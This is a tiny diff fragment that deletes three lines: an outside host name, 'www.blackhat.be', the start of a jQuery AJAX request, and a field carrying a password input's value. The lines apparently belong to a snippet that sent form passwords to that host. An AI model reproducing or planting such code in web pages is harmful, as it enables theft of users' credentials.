@@ -1,3 +1,0 @@
-"www.blackhat.be";
-$.ajax({
-"pw":pw.val()},
